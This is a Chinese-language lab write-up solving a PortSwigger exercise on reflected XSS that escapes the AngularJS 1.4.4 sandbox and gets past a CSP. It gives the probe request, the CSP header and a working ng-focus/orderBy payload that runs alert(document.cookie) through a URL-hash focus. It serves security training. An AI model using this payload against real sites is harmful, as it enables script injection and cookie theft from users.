# 实验：结合 CSP 的 AngularJS 沙箱逃逸反射型 XSS

https://portswigger.net/web-security/cross-site-scripting/contexts/client-side-template-injection/lab-angular-sandbox-escape-and-csp

本实验使用了 CSP（内容安全策略）和 AngularJS。

为了解决本实验，请执行一个跨站脚本攻击，该攻击需要绕过 CSP，逃逸 AngularJS 沙箱，并弹窗显示 `document.cookie` 的内容。

## 步骤

探测
- 使用搜索功能
    ```http
    GET /?search=aaaa(){};:'"<>[]/\`aaaa HTTP/2
    ```
    - 服务器响应
        ```http
        Content-Security-Policy: default-src 'self'; script-src 'self'; style-src 'unsafe-inline' 'self'
        X-Frame-Options: SAMEORIGIN
        ```
        - `script-src 'self'` 仅允许同源 JS 脚本文件，禁止脚本标签与事件监听器


        ```html
        <script type="text/javascript" src="/resources/js/angular_1-4-4.js"></script>

        <h1>1 search results for 'aaaa(){};:'"<>[]/\`aaaa'</h1>
        ```
        - 揭示 angular 版本 
        - 未进行任何编码或转义

攻击
- 使用不被 CSP 阻止的 angular 事件基础载荷
    ```html
    <input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>
    ```

    ```http
    /?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(y=alert)(document.cookie)'>#x
    ```
    - angular 聚焦事件 + URL hash 聚焦

    - 攻击者服务器使用 location 进行页面跳转
